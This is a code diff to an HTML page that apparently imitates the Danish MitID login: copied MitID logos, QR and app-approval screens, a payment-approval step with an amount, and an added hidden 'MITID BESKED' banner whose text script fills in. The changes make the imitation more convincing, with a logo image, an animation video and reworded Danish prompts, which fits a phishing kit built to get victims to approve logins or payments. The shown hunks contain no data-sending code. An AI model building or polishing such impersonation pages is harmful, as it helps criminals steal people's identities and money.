@@ -16,15 +16,27 @@
 @keyframes pulseSub{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.7;transform:scale(1.04)}}
 </style>
 </head>
-<body class="min-h-screen bg-white flex items-center justify-center p-4">
+<body class="min-h-screen bg-white flex flex-col items-center justify-center p-4">
+<!-- MitID Besked banner -->
+<div id="mitidBanner" style="background:linear-gradient(135deg,#003a99 0%,#0052cc 40%,#003a99 100%);color:#fff;padding:14px 20px;display:flex;align-items:flex-start;gap:12px;box-shadow:rgba(0,58,153,.5) 0 4px 20px;border-bottom:2px solid rgba(255,255,255,.25);display:none;">
+  <div style="flex-shrink:0;width:auto;height:auto;border-radius:8px;background:transparent;display:flex;align-items:center;justify-content:center;">
+    <div style="background:#fff;border-radius:6px;padding:4px 6px;display:flex;align-items:center;justify-content:center;">
+      <svg width="40" height="11" viewBox="0 0 61 16" style="height:18px;width:auto;object-fit:contain;display:block;">
+        <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
+      </svg>
+    </div>
+  </div>
+  <div style="flex:1;">
+    <div style="font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;opacity:.85;margin-bottom:3px;font-family:system-ui,-apple-system,sans-serif;">MITID BESKED</div>
+    <div id="mitidBannerText" style="font-size:14px;font-weight:500;line-height:1.4;font-family:system-ui,-apple-system,sans-serif;"></div>
+  </div>
+</div>
 
 <div class="w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm">
   <!-- HEADER -->
   <div class="flex justify-between items-center px-8 py-6 border-b border-[#d8d8d8] animate-fade-in">
     <h1 class="text-[20px] font-bold text-[#1a1a1a] tracking-tight" id="formHeading">Log på hos MitID.dk</h1>
-    <svg width="46" height="24" viewBox="0 0 61 16" style="height:24px" aria-label="MitID">
-      <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
-    </svg>
+    <img src="/assets/mitid-logo.png" alt="MitID" style="height:24px;width:auto;">
   </div>
 
   <!-- INDHOLD -->
@@ -36,14 +48,9 @@
         <svg width="92" height="24" viewBox="0 0 61 16" style="margin-bottom:36px;transform:scale(1.6)">
           <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
         </svg>
-        <div style="position:relative;width:110px;height:110px;margin:0 auto 28px;">
-          <svg viewBox="0 0 100 117" style="width:100%;height:100%;animation:pulseSub 1.6s ease-in-out infinite">
-            <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
-          </svg>
-          <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:28px;height:28px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spinSlow .8s linear infinite;"></div>
-        </div>
+        <video src="/assets/mitid-animation.mp4" autoplay loop muted playsinline style="width:110px;height:110px;margin:0 auto 28px;display:block;"></video>
         <div style="font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:8px;">Forbinder sikkert til MitID</div>
-        <div style="font-size:14px;color:#5c5c5c;">Vent et øjeblik ...</div>
+        <div style="font-size:14px;color:#5c5c5c;">Vent venligst ...</div>
       </div>
     </div>
 
@@ -83,7 +90,7 @@
     <div id="stepQr" class="hidden">
       <div style="text-align:center;padding:10px 0 4px;">
         <div id="qrcode" style="display:inline-block;background:#fff;border:1px solid #d8d8d8;padding:14px;border-radius:4px;"></div>
-        <div style="font-size:15px;font-weight:600;color:#1a1a1a;padding:14px 0 4px;">Scan QR-kode med MitID app</div>
+        <div style="font-size:17px;font-weight:700;color:#1a1a1a;padding:14px 0 2px;">Scan QR-koden</div><div style="font-size:14px;color:#5c5c5c;padding-bottom:8px;">Brug din MitID app til at scanne koden</div>
       </div>
       <div class="pt-4">
         <div class="border-t border-[#d8d8d8] pt-4 text-center">
@@ -97,13 +104,8 @@
       <div style="text-align:center;padding:8px 0;">
         <div id="betAmount" style="font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:8px;"></div>
         <div id="betTitle" style="font-size:17px;color:#1a1a1a;margin-bottom:18px;"></div>
-        <div style="position:relative;width:96px;height:96px;margin:0 auto 20px;">
-          <svg viewBox="0 0 100 117" style="width:100%;height:100%;animation:pulseSub 1.6s ease-in-out infinite">
-            <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
-          </svg>
-          <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:26px;height:26px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spinSlow .8s linear infinite;"></div>
-        </div>
-        <div style="font-size:15px;color:#1a1a1a;">Godkend i MitID appen ...</div>
+        <video src="/assets/mitid-animation.mp4" autoplay loop muted playsinline style="width:96px;height:96px;margin:0 auto 20px;display:block;"></video>
+        <div style="font-size:15px;color:#1a1a1a;">Åbn MitID app og godkend</div>
       </div>
       <div class="pt-4">
         <div class="border-t border-[#d8d8d8] pt-4 text-center">
@@ -118,14 +120,9 @@
         <svg width="92" height="24" viewBox="0 0 61 16" style="margin-bottom:36px;transform:scale(1.6)">
           <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
         </svg>
-        <div style="position:relative;width:110px;height:110px;margin:0 auto 28px;">
-          <svg viewBox="0 0 100 117" style="width:100%;height:100%;animation:pulseSub 1.6s ease-in-out infinite">
-            <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
-          </svg>
-          <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:28px;height:28px;border:4px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spinSlow .8s linear infinite;"></div>
-        </div>
+        <video src="/assets/mitid-animation.mp4" autoplay loop muted playsinline style="width:110px;height:110px;margin:0 auto 28px;display:block;"></video>
         <div style="font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:8px;">Godkender identitet</div>
-        <div style="font-size:14px;color:#5c5c5c;">Vent et øjeblik ...</div>
+        <div style="font-size:14px;color:#5c5c5c;">Vent venligst ...</div>
       </div>
     </div>
 
